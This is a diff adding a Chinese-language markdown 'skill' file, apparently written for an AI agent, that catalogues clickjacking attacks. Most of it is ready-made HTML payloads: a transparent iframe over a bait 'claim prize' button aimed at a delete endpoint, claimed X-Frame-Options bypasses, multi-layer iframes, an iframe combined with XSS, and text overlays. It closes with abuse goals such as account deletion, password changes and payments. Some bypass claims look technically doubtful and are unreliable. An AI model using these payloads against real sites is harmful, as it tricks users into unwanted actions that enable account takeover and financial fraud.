@@ -1,0 +1,65 @@
+---
+name: clickjacking
+description: Use when encountering 点击劫持漏洞利用 - 基础攻击、绕过x-frame-options、多层iframe、组合攻击
+---
+
+# 点击劫持攻击
+
+## Info
+
+- **Domain**: web
+- **Tags**: web, clickjacking
+
+## 基础攻击
+```html
+<style>
+iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; }
+button { position:absolute; top:100px; left:100px; }
+</style>
+<iframe src="http://target.com/delete"></iframe>
+<button>点击领取奖品</button>
+```
+
+## 绕过X-Frame-Options
+```html
+<!-- 使用<meta>标签 (某些情况) -->
+<meta http-equiv="X-Frame-Options" content="allow">
+
+<!-- 使用srcdoc -->
+<iframe srcdoc="<iframe src='http://target.com/action'></iframe>"></iframe>
+
+<!-- 使用data URI -->
+<iframe src="data:text/html,<iframe src='http://target.com/action'></iframe>"></iframe>
+```
+
+## 多层iframe
+```html
+<iframe src="http://target.com/page1" id="f1"></iframe>
+<iframe src="http://target.com/page2" id="f2"></iframe>
+<button onclick="document.getElementById('f1').click()">Click</button>
+```
+
+## 组合XSS
+```html
+<!-- 配合XSS扩大危害 -->
+<iframe src="http://target.com/profile?name=<script>document.cookie</script>"></iframe>
+```
+
+## 文字覆盖
+```html
+<style>
+iframe { width:800px; height:600px; opacity:0.5; position:absolute; }
+.cover { position:absolute; top:200px; left:300px; background:white; }
+</style>
+<iframe src="http://target.com/action"></iframe>
+<div class="cover">点击这里</div>
+```
+
+## 常见利用场景
+```
+- 删除账户/数据
+- 修改密码/邮箱
+- 授权第三方应用
+- 转账/支付
+- 关注/点赞
+```
